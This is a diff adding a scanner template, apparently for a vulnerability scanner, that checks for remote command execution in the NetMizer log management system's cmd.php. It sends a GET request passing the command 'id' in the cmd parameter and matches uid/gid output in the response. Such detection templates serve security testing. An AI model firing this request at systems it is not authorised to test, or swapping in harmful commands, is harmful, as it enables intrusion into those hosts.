@@ -1,0 +1,19 @@
+id: netmizer-log-management-cmd-php-rce
+
+info:
+  name: NetMizer 日志管理系统 cmd.php 远程命令执行漏洞
+  author: zan8in
+  severity: critical
+  description: |
+    NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行
+    title="NetMizer 日志管理系统"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/NetMizer/NetMizer%20%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20cmd.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /data/manage/cmd.php?cmd=id
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
